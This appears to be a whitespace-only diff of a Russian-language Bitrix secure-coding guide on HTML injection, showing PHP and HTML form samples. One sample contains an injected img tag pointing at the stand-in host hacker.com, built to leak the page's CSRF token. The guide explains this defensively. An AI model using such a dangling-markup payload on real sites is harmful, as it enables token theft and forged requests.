@@ -88,10 +88,10 @@ HTML-инъекции могут нарушить форматирование �
 
 ```php
 <form method="POST" action="/action.php">
-	<input type="text" name="foo" value="<?= $injection ?>"
-	<!-- Это наш секретный CSRF-токен! -->
-	<?= bitrix_sessid_post() ?>
-	...
+    <input type="text" name="foo" value="<?= $injection ?>"
+    <!-- Это наш секретный CSRF-токен! -->
+    <?= bitrix_sessid_post() ?>
+    ...
 </form>
 <script>
     var someVar = 'text';
@@ -102,13 +102,13 @@ HTML-инъекции могут нарушить форматирование �
 
 ```html
 <form method="POST" action="action.php">
-	<input type="text" name="foo" value="" />
-	<img src='http://hacker.com?token="'>
-	<!-- Это наш секретный CSRF-токен! -->	
-	<input type="hidden" name="sessid" id="sessid" value="random" />
+    <input type="text" name="foo" value="" />
+    <img src='http://hacker.com?token="'>
+    <!-- Это наш секретный CSRF-токен! -->	
+    <input type="hidden" name="sessid" id="sessid" value="random" />
 </form>
 <script>
-	var someVar = 'text';
+    var someVar = 'text';
 </script>
 ```
 
@@ -116,8 +116,8 @@ HTML-инъекции могут нарушить форматирование �
 
 ```php
 <form method="POST" action="/some.page">
-	<?= bitrix_sessid_post() ?>
-	...
+    <?= bitrix_sessid_post() ?>
+    ...
 </form>
 ```
 
